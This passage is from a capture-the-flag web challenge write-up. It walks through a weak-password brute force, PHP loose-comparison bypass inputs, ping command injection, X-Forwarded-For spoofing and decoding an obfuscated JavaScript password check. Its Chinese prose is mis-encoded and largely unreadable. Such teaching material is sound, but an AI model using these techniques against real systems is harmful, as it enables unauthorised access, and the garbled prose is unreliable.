trueÔºåÁî®Êà∑Âè™ÊòØ‰∏çËÉΩÁºñËæëÂØπÂ∫îÁöÑÊñáÊú¨ÔºåÂèØÊòØ‰ªçÁÑ∂ËÉΩÂ§üËÅöÁÑ¶ÁÑ¶ÁÇπÔºåËÄå‰∏îÂú®Êèê‰∫§Ë°®ÂçïÁöÑÊó∂ÂÄôÔºåËØ•ËæìÂÖ•È°π‰ºöÂÅö‰∏∫ form ÁöÑ‰∏ÄÈ°πÊèê‰∫§„ÄÇ</p>\n</blockquote>\n<p>ÊâÄ‰ª•Êàë‰ª¨Â∞ÜÂÖ∂Âà†ÊéâÂ∞±Ë°å„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824203628188.png\" alt=\"image-20230824203628188\"></p>\n<p><img data-src=\"/img/webpic/image-20230824203644118.png\" alt=\"image-20230824203644118\"></p>\n<p>ÂæóÂà∞ flag</p>\n<h2 id=\"get_post\"><a class=\"markdownIt-Anchor\" href=\"#get_post\">#</a> get_post:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824203743132.png\" alt=\"image-20230824203743132\"></p>\n<p>‰∏§ÁßçËØ∑Ê±ÇÊñπÂºèÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824204018624.png\" alt=\"image-20230824204018624\"></p>\n<blockquote>\n<p>GET ËØ∑Ê±ÇÁõ¥Êé•Âú® url ÂêéÔºåËøõË°åÂèÇÊï∞ÁöÑÊ∑ªÂä†„ÄÇ</p>\n<p>POST ËØ∑Ê±ÇÈúÄË¶ÅÂÄüÂä© hackbar„ÄÇ</p>\n</blockquote>\n<p>Âè¶Â§ñÂá†ÁßçËØ∑Ê±ÇÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824204218269.png\" alt=\"image-20230824204218269\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204233311.png\" alt=\"image-20230824204233311\"></p>\n<p><img data-src=\"/img/webpic/image-20230824204248645.png\" alt=\"image-20230824204248645\"></p>\n<p>ÂõûÂΩíÈ¢òÁõÆÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824204355681.png\" alt=\"image-20230824204355681\"></p>\n<p>ÂæóÂà∞ flag</p>\n<h2 id=\"weak_auth\"><a class=\"markdownIt-Anchor\" href=\"#weak_auth\">#</a> weak_auth:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824204503329.png\" alt=\"image-20230824204503329\"></p>\n<p>È¢òÁõÆÊòØ‰∏™Âº±ÂØÜÁ†ÅÈ¢òÁõÆÔºö</p>\n<p>ÂèØ‰ª•Áõ¥Êé•ÁåúÁÆÄÂçïÂØÜÁ†ÅËøõË°åÁôªÂΩïÔºå‰πüÂèØ‰ª•Áî® burp ËøõË°åÁàÜÁ†¥„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824204634276.png\" alt=\"image-20230824204634276\"></p>\n<p>ËøõÂÖ•ÁΩëÈ°µÂêéÊòØËøôÊ†∑ÁöÑÁïåÈù¢„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824204721446.png\" alt=\"image-20230824204721446\"></p>\n<p>ÂΩìÊàë‰ª¨ËæìÂÖ•Áî®Êà∑ÂêçÊó∂ÔºåÊèêÁ§∫Êàë‰ª¨Áî® admin ÂéªÁôªÂΩï„ÄÇÊâÄ‰ª•ËøôÈ¢òÊàë‰ª¨Âè™ÈúÄË¶ÅÂéªÁàÜÁ†¥ÂØÜÁ†ÅÂç≥ÂèØ„ÄÇ</p>\n<p>ÂΩìÊàë‰ª¨ËØ∑Ê±ÇÊìç‰ΩúÊó∂ÔºåÊã¶Êà™‰∏ãÊù•ËøôÊ†∑ÁöÑÊï∞ÊçÆÂåÖ„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824204915845.png\" alt=\"image-20230824204915845\"></p>\n<p>ËøôÊ†∑ÂéªÊûÑÈÄ† payload ÂéªËøõË°åÁàÜÁ†¥ÂØÜÁ†Å</p>\n<p><img data-src=\"/img/webpic/image-20230824205021958.png\" alt=\"image-20230824205021958\"></p>\n<p>Âä†ËΩΩÊàë‰ª¨ÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏ÔºåÂºÄÂßãÊîªÂáª</p>\n<p><img data-src=\"/img/webpic/image-20230824205112705.png\" alt=\"image-20230824205112705\"></p>\n<p>‰ªéÈïøÂ∫¶Ëé∑Áü•ÂØÜÁ†ÅÂ∫î‰∏∫ 123456</p>\n<p><img data-src=\"/img/webpic/image-20230824205327991.png\" alt=\"image-20230824205327991\"></p>\n<p>Êü•ÁúãÂìçÂ∫îÂåÖÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824205351133.png\" alt=\"image-20230824205351133\"></p>\n<p>ÂæóÂà∞ flag</p>\n<h2 id=\"simple_php\"><a class=\"markdownIt-Anchor\" href=\"#simple_php\">#</a> simple_php:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824205450364.png\" alt=\"image-20230824205450364\"></p>\n<p><img data-src=\"/img/webpic/image-20230824205521655.png\" alt=\"image-20230824205521655\"></p>\n<p>ÂèëÁé∞ÊòØ php ÂéªÈúÄË¶ÅÂà§Êñ≠ÁöÑÂÜçËÉΩËé∑Âèñ‰∏§‰∏™ÈÉ®ÂàÜÁöÑ flag ÁöÑ„ÄÇ</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">==</span><span class=\"token number\">0</span> <span class=\"token keyword\">and</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>== Âº±Á±ªÂûãÊØîËæÉ„ÄÇÈúÄË¶Å‰∫ÜËß£ php Á±ªÂûãÊØîËæÉÁöÑÁâπÊÄß„ÄÇ</p>\n<p><strong>PHP Á±ªÂûãÊØîËæÉ</strong></p>\n<ul>\n<li>ÊùæÊï£ÊØîËæÉÔºö‰ΩøÁî®‰∏§‰∏™Á≠âÂè∑ == ÊØîËæÉÔºåÂè™ÊØîËæÉÂÄºÔºå‰∏çÊØîËæÉÁ±ªÂûã„ÄÇ</li>\n<li>‰∏•Ê†ºÊØîËæÉÔºöÁî®‰∏â‰∏™Á≠âÂè∑ === ÊØîËæÉÔºåÈô§‰∫ÜÊØîËæÉÂÄºÔºå‰πüÊØîËæÉÁ±ªÂûã„ÄÇ</li>\n</ul>\n<p>** ÊñπÊ≥ïÔºö**php ‰∏≠ÁöÑÂº±Á±ªÂûãÊØîËæÉ‰ºö‰Ωø‚Äôabc‚Äô == 0 ‰∏∫ÁúüÔºåÊâÄ‰ª•ËæìÂÖ• a=abc Êó∂ÔºåÂèØÂæóÂà∞ flag1</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">></span><span class=\"token number\">1234</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>is_numeric () ÂáΩÊï∞‰ºöÂà§Êñ≠Â¶ÇÊûúÊòØÊï∞Â≠óÂíåÊï∞Â≠óÂ≠óÁ¨¶‰∏≤ÂàôËøîÂõû TRUEÔºåÂê¶ÂàôËøîÂõû FALSE, ‰∏î php ‰∏≠Âº±Á±ªÂûãÊØîËæÉÊó∂Ôºå‰ºö‰Ωø (‚Äò1234a‚Äô == 1234)</p>\n<p>** ÊñπÊ≥ïÔºö** ËæìÂÖ• b=1235c Âç≥ÂèØ„ÄÇ</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210310021.png\" alt=\"image-20230824210310021\"></p>\n<h2 id=\"command_execution\"><a class=\"markdownIt-Anchor\" href=\"#command_execution\">#</a> command_execution:&gt;</h2>\n<blockquote>\n<p>ÂëΩ‰ª§ÊâßË°å</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824210429004.png\" alt=\"image-20230824210429004\"></p>\n<blockquote>\n<p><strong>WAF:</strong></p>\n<p>Web Â∫îÁî®Á®ãÂ∫èÈò≤ÁÅ´Â¢ôÔºàÊúâÊó∂‰πüÁÆÄÁß∞‰∏∫ WAF ÔºâÂèØ‰ª•ÈÄöËøáÁõëËßÜÂíåËøáÊª§ Internet ‰∏éÁΩëÁ´ô‰πãÈó¥ÁöÑ HTTP ÈÄö‰ø°Êù•‰øùÊä§ÁΩëÁ´ô„ÄÇ</p>\n<p>‰∏Ä‰∏™ WAF ÂèØ‰ª•Èò≤Ê≠¢ÁΩëÁ´ôÂèóË∑®Á´ôËØ∑Ê±Ç‰º™ÈÄ†ÁöÑÂñúÊ¨¢ÔºàË¢´ÊîªÂáª CSRFÔºâÔºåÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÔºàLFIÔºâÔºåSQL Ê≥®ÂÖ•ÔºåË∑®Á´ôÁÇπËÑöÊú¨ÔºàXSSÔºâÔºåÁ≠âÁ≠â„ÄÇ</p>\n<p>ËæìÂÖ•È™åËØÅÊïàÊûú‰∏ç‰Ω≥ÁöÑÁΩëÁ´ôÂèØËÉΩÂÆπÊòìÂèóÂà∞‰ª£Á†ÅÊ≥®ÂÖ•ÊºèÊ¥ûÁöÑÊîªÂáªÔºåËøô‰ΩøÊîªÂáªËÄÖËØïÂõæËÆ© SQL ËØ≠Âè•ÊΩúË°å‰ª•ËÆøÈóÆÊú™ÁªèÊéàÊùÉÁöÑÊï∞ÊçÆÂ∫ì„ÄÇWAF ÂèØ‰ª•Ê£ÄÊµãÂπ∂ÈòªÊ≠¢Ëøô‰∫õÂ∞ùËØï„ÄÇËøáÊó∂ÁöÑÂ∫ìÂíåËΩØ‰ª∂‰πüÊòØÊòìÂèóÊîªÂáªÁöÑÈ¢ÜÂüüÔºå‰ΩÜ Web Â∫îÁî®Á®ãÂ∫èÈò≤ÁÅ´Â¢ôÂèØ‰ª•Áî®‰Ωú‰∏¥Êó∂Ëß£ÂÜ≥ÊñπÊ°àÔºåÂπ∂ÈòªÊ≠¢Ëøô‰∫õÊºèÊ¥ûÔºåÂπ∂ÂØπÂÖ∂ËøõË°å‰øÆË°•„ÄÇ</p>\n</blockquote>\n<p>È¢òÁõÆÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824210729558.png\" alt=\"image-20230824210729558\"></p>\n<blockquote>\n<p>ping Áî®‰∫éÁ°ÆÂÆöÊú¨Âú∞‰∏ªÊú∫ÊòØÂê¶ËÉΩ‰∏éÂè¶‰∏ÄÂè∞‰∏ªÊú∫ÊàêÂäü‰∫§Êç¢ (ÂèëÈÄÅ‰∏éÊé•Êî∂) Êï∞ÊçÆÂåÖÔºåÂÜçÊ†πÊçÆËøîÂõûÁöÑ‰ø°ÊÅØÔºåÂ∞±ÂèØ‰ª•Êé®Êñ≠ TCP/IP ÂèÇÊï∞ÊòØÂê¶ËÆæÁΩÆÊ≠£Á°ÆÔºå‰ª•ÂèäËøêË°åÊòØÂê¶Ê≠£Â∏∏„ÄÅÁΩëÁªúÊòØÂê¶ÈÄöÁïÖÁ≠â</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824211021366.png\" alt=\"image-20230824211021366\"></p>\n<p>ÂèëÁé∞ÊúâÂõûÊòæÔºåËøô‰∏ãÊù•ËøõË°åÊãºÊé•ÔºåÊâßË°åÂëΩ‰ª§Ê≥®ÂÖ•Ôºö</p>\n<p><img data-src=\"/img/webpic/image-20230824211133151.png\" alt=\"image-20230824211133151\"></p>\n<p>ÂèëÁé∞ ls Ë¢´ÊâßË°å„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824211309540.png\" alt=\"image-20230824211309540\"></p>\n<p>ÊâæÂà∞ flag ‰ΩçÁΩÆ</p>\n<p><img data-src=\"/img/webpic/image-20230824211410392.png\" alt=\"image-20230824211410392\"></p>\n<p>ÂæóÂà∞ flag</p>\n<h2 id=\"xff_referer\"><a class=\"markdownIt-Anchor\" href=\"#xff_referer\">#</a> xff_referer:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824211448543.png\" alt=\"image-20230824211448543\"></p>\n<p>ËÆ∞ÂΩï‰∏Ä‰∏ãÔºö&gt;</p>\n<blockquote>\n<p>‚Äã\t**User-AgentÔºö** ‰ΩøÂæóÊúçÂä°Âô®ËÉΩÂ§üËØÜÂà´ÂÆ¢Êà∑‰ΩøÁî®ÁöÑÊìç‰ΩúÁ≥ªÁªüÔºåÊµèËßàÂô®ÁâàÊú¨Á≠â.ÔºàÂæàÂ§öÊï∞ÊçÆÈáèÂ§ßÁöÑÁΩëÁ´ô‰∏≠‰ºöËÆ∞ÂΩïÂÆ¢Êà∑‰ΩøÁî®ÁöÑÊìç‰ΩúÁ≥ªÁªüÊàñÊµèËßàÂô®ÁâàÊú¨Á≠âÂ≠òÂÖ•Êï∞ÊçÆÂ∫ì‰∏≠Ôºâ</p>\n<p>‚Äã\t**CookieÔºö** ÁΩëÁ´ô‰∏∫‰∫ÜËæ®Âà´Áî®Êà∑Ë∫´‰ªΩËøõË°å session Ë∑üË∏™ÔºåÂπ∂ÂÇ®Â≠òÂú®Áî®Êà∑Êú¨Âú∞ÁªàÁ´Ø‰∏äÁöÑÊï∞ÊçÆÔºàÈÄöÂ∏∏ÁªèËøáÂä†ÂØÜÔºâ</p>\n<p>‚Äã\t <strong>X-Forwarded-For</strong>ÔºöÁÆÄÁß∞ XFF Â§¥Ôºå‰ª£Ë°®‰∫Ü HTTP ÁöÑËØ∑Ê±ÇÁ´ØÁúüÂÆûÁöÑ IP„ÄÇÂÆÉË¢´ËÆ§‰∏∫ÊòØÂÆ¢Êà∑Á´ØÈÄöËøá HTTP ‰ª£ÁêÜÊàñËÄÖË¥üËΩΩÂùáË°°Âô®ËøûÊé•Âà∞ web ÊúçÂä°Á´ØËé∑ÂèñÊ∫ê ip Âú∞ÂùÄÁöÑ‰∏Ä‰∏™Ê†áÂáÜÔºàÈÄöÂ∏∏‰∏Ä‰∫õÁΩëÁ´ôÁöÑÈò≤Ê≥®ÂÖ•ÂäüËÉΩ‰ºöËÆ∞ÂΩïËØ∑Ê±ÇÁ´ØÁúüÂÆû IP Âú∞ÂùÄÂπ∂ÂÜôÂÖ•Êï∞ÊçÆÂ∫ìÊàñÊüêÊñá‰ª∂ [ÈÄöËøá‰øÆÊîπ XXF Â§¥ÂèØ‰ª•ÂÆûÁé∞‰º™ÈÄ† IP]Ôºâ„ÄÇ</p>\n<p>‚Äã\t**RefererÔºö** ÊµèËßàÂô®Âêë WEB ÊúçÂä°Âô®Ë°®ÊòéËá™Â∑±ÁöÑÈ°µÈù¢Êù•Ê∫ê„ÄÇ</p>\n<p>‚Äã\t**HostÔºö** ÂÆ¢Êà∑Á´ØÊåáÂÆöËá™Â∑±ÊÉ≥ËÆøÈóÆÁöÑ WEB ÊúçÂä°Âô®ÁöÑÂüüÂêç / IP Âú∞ÂùÄÂíåÁ´ØÂè£Âè∑„ÄÇ</p>\n</blockquote>\n<blockquote>\n<p><strong>02XFF Ê≥®ÂÖ•ÁöÑÊ¶ÇÂøµ</strong></p>\n<p>‚Äã\tXFFÔºåÊòØ X-Forwarded-for ÁöÑÁº©ÂÜôÔºåÂ±û‰∫é SQL Ê≥®ÂÖ•ÁöÑ‰∏ÄÁßçÔºåËØ•Ê≥®ÂÖ•ÂéüÁêÜÊòØÈÄöËøá‰øÆÊîπ X-Forwarded-for Â§¥ÂØπÂ∏¶ÂÖ•Á≥ªÁªüÁöÑ dns ËøõË°å sql Ê≥®ÂÖ•ÔºåËææÂà∞Ê¨∫È™óÊúçÂä°Âô®ÊâßË°åÊÅ∂ÊÑèÁöÑ SQL ÂëΩ‰ª§ÁöÑÊïàÊûúÔºå‰ªéËÄåÂèØ‰ª•ÂæóÂà∞ÁΩëÁ´ôÁöÑÊï∞ÊçÆÂ∫ìÂÜÖÂÆπ„ÄÇ</p>\n<p><strong>03XFF ÁöÑÂç±ÂÆ≥</strong></p>\n<p>‚Äã\t‚ë†Êï∞ÊçÆÂ∫ì‰ø°ÊÅØÊ≥ÑÊºèÔºöÊï∞ÊçÆÂ∫ì‰∏≠Â≠òÊîæÁöÑÁî®Êà∑ÁöÑÈöêÁßÅ‰ø°ÊÅØÁöÑÊ≥ÑÈú≤„ÄÇ</p>\n<p>‚Äã\t‚ë°ÁΩëÈ°µÁØ°ÊîπÔºöÈÄöËøáÊìç‰ΩúÊï∞ÊçÆÂ∫ìÂØπÁâπÂÆöÁΩëÈ°µËøõË°åÁØ°Êîπ„ÄÇ</p>\n<p>‚Äã\t‚ë¢ÁΩëÁ´ôË¢´ÊåÇÈ©¨Ôºå‰º†Êí≠ÊÅ∂ÊÑèËΩØ‰ª∂Ôºö‰øÆÊîπÊï∞ÊçÆÂ∫ì‰∏Ä‰∫õÂ≠óÊÆµÁöÑÂÄºÔºåÂµåÂÖ•ÁΩëÈ©¨ÈìæÊé•ÔºåËøõË°åÊåÇÈ©¨ÊîªÂáª„ÄÇ</p>\n<p>‚Äã\t‚ë£Êï∞ÊçÆÂ∫ìË¢´ÊÅ∂ÊÑèÊìç‰ΩúÔºöÊï∞ÊçÆÂ∫ìÊúçÂä°Âô®Ë¢´ÊîªÂáªÔºåÊï∞ÊçÆÂ∫ìÁöÑÁ≥ªÁªüÁÆ°ÁêÜÂëòÂ∏êÊà∑Ë¢´Á™úÊîπ„ÄÇ</p>\n<p>‚Äã\t‚ë§ÊúçÂä°Âô®Ë¢´ËøúÁ®ãÊéßÂà∂ÔºåË¢´ÂÆâË£ÖÂêéÈó®„ÄÇÁªèÁî±Êï∞ÊçÆÂ∫ìÊúçÂä°Âô®Êèê‰æõÁöÑÊìç‰ΩúÁ≥ªÁªüÊîØÊåÅÔºåËÆ©ÈªëÂÆ¢Âæó‰ª•‰øÆÊîπÊàñÊéßÂà∂Êìç‰ΩúÁ≥ªÁªü„ÄÇ</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824212024008.png\" alt=\"image-20230824212024008\"></p>\n<p>È¢òÁõÆÔºö</p>\n<p><img data-src=\"/img/webpic/image-20230824211956203.png\" alt=\"image-20230824211956203\"></p>\n<p>ÊèêÁ§∫ ip ÂøÖÈ°ª 123.123.123.123ÔºåÂà©Áî® xff ‰º™ÈÄ† ip„ÄÇ</p>\n<p>‰ΩøÁî® burp</p>\n<p><img data-src=\"/img/webpic/image-20230824215131470.png\" alt=\"image-20230824215131470\"></p>\n<p>ËøõË°åËØ∑Ê±Ç‰º™ÈÄ†Ôºö</p>\n<p><img data-src=\"/img/webpic/image-20230824215155754.png\" alt=\"image-20230824215155754\"></p>\n<p>ÂæóÂà∞ flag</p>\n<h2 id=\"training-www-robots\"><a class=\"markdownIt-Anchor\" href=\"#training-www-robots\">#</a> Training-WWW-Robots:&gt;</h2>\n<blockquote>\n<p>ÂæàÊòéÊòæÔºåËøôËøòÊòØ‰∏Ä‰∏™Âíå Robots ÊúâÂÖ≥ÁöÑÈ¢òÁõÆ</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824215510884.png\" alt=\"image-20230824215510884\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215659606.png\" alt=\"image-20230824215659606\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215731279.png\" alt=\"image-20230824215731279\"></p>\n<p>ÂæóÂà∞ flag</p>\n<h2 id=\"simple_js\"><a class=\"markdownIt-Anchor\" href=\"#simple_js\">#</a> simple_js:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824215817083.png\" alt=\"image-20230824215817083\"></p>\n<p><img data-src=\"/img/webpic/image-20230824215915164.png\" alt=\"image-20230824215915164\"></p>\n<p>È¢òÁõÆÁïåÈù¢</p>\n<p>Áî® burp Êäì‰∏Ä‰∏ãÂåÖ„ÄÇÁúã‰∏ãÂìçÂ∫îÁöÑÊÉÖÂÜµ„ÄÇ</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">pass_enc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>    <span class=\"token comment\">// ‰º†ÂÖ•ÁöÑÂØÜÁ†Å</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">var</span> pass <span class=\"token operator\">=</span> <span class=\"token string\">\"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// ÈúÄË¶ÅÊØîÂØπÁöÑÂØÜÁ†Å  // ËøôÊòØÊä•Èîô‰ø°ÊÅØ  FAUX PASSWORD HAHA</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">var</span> tab  <span class=\"token operator\">=</span> pass_enc<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// ÂØπ‰º†ÂÖ•ÁöÑÂØÜÁ†ÅÊèíÂÖ•</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token keyword\">var</span> tab2 <span class=\"token operator\">=</span> pass<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">var</span> i<span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">,</span>l<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>o<span class=\"token punctuation\">,</span>p <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                        k <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>n<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                        n <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>o<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                        o <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>i<span class=\"token operator\">-</span>l<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">></span> <span class=\"token number\">5</span> <span class=\"token operator\">&amp;&amp;</span> i <span class=\"token operator\">&lt;</span> k<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                                        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>o <span class=\"token operator\">=</span> tab2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        p <span class=\"token operator\">+=</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">fromCharCode</span><span class=\"token punctuation\">(</span>tab2<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>      <span class=\"token comment\">// ËøôÈáåÂè™ËøîÂõû‰∫ÜÈÉ®ÂàÜÂ≠óÁ¨¶</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pass <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span><span class=\"token keyword\">return</span> pass<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    String<span class=\"token punctuation\">[</span><span class=\"token string\">\"fromCharCode\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// ÈúÄË¶ÅÂØπÊØîÁöÑÂØÜÁ†Å</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    h <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span><span class=\"token function\">prompt</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Enter password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span> <span class=\"token function\">dechiffre</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>pass_enc**.split (**) ÊñπÊ≥ïÁî®‰∫éÊää‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂàÜÂâ≤ÊàêÂ≠óÁ¨¶‰∏≤Êï∞ÁªÑ</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># ascii ËΩ¨Â≠óÁ¨¶‰∏≤</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>hex_string <span class=\"token operator\">=</span> <span class=\"token string\">r\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>hex_values <span class=\"token operator\">=</span> hex_string<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">r'\\x'</span><span class=\"token punctuation\">)</span><span class=\"token 